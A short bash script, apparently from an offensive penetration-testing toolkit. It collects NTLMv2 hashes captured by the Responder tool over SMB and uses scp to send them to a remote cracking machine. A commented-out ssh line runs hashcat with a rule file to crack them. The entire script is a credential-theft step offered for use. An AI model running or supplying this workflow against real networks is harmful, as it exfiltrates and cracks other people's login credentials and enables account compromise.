#!/bin/bash
#This section assumes you have a cracking rig (AKA big-rig for my team) already connected via VPN somewhere. 
#If you don't, you can run this locally or just comment it out
#This will grab all the SMB responder hash logs, scp them to the big-rig cracking machine, and recommend hashcat

#Right now this doesn't keep track of which hashes are which - it copies ALL hashes, with no house cleaning./ we need to make sure it doesn't grow too big!


mkdir autopwn_hashes
cp /usr/share/responder/logs/SMB-NTLM*.txt ./autopwn_hashes/
scp autopwn_hashes/* autopwn@big-rig:/home/dispareo/autopwn
#Now that the file is copied over, crack it!
#ssh -o StrictHostKeyChecking=no -l dispareo big-rig "hashcat -m 5600 -a 0 autopwn_hashes -w 4 -r OneRuleToRuleThemStill.rule"

